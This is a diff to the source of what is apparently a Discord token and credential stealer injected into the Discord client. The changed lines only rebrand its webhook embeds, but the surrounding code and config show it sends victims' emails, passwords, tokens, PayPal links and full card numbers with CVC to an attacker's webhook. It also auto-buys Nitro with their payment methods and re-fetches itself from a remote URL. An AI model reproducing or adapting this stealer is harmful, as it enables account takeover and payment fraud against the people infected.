@@ -8,8 +8,8 @@ const config = {
   auto_buy_nitro: true, //automatically buys nitro for you if they add credit card or paypal or tries to buy nitro themselves
   ping_on_run: false, //sends whatever value you have in ping_val when you get a run/login
   ping_val: "@everyone", //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
-  embed_name: "Discord Injection", //name of the webhook thats gonna send the info
-  embed_icon:"https://cdn.discordapp.com/avatars/777449557876277249/3929b0c854272fb4e3d5575f90254b72.png?size=1024", //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
+  embed_name: "Discord Injection [Python]", //name of the webhook thats gonna send the info
+  embed_icon:"https://cdn.discordapp.com/attachments/861851773740384257/969240529369956352/7365c62e80ea9bdfb8217135c047033f.jpg", //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
   embed_color: 5576300, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
   webhook: "%WEBHOOK%", //your discord webhook there obviously
   injection_url: "https://raw.githubusercontent.com/xrevix/injection/main/injection.js", //injection url for when it reinjects
@@ -352,7 +352,7 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: "Discord-Injection • 💜",
+          text: "💜 • Discord Injection • [Python]",
         },
       },
     ],
@@ -394,7 +394,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: "Discord-Injection • 💜",
+          text: "💜 • Discord Injection • [Python]",
         },
       },
     ],
@@ -436,7 +436,7 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: "Discord-Injection • 💜",
+          text: "💜 • Discord Injection • [Python]",
         },
       },
     ],
@@ -478,7 +478,7 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: "Discord-Injection • 💜",
+          text: "💜 • Discord Injection • [Python]",
         },
       },
     ],
@@ -520,7 +520,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: "Discord-Injection • 💜",
+          text: "💜 • Discord Injection • [Python]",
         },
       },
     ],
@@ -564,7 +564,7 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: "Discord-Injection • 💜",
+          text: "💜 • Discord Injection • [Python]",
         },
       },
     ],
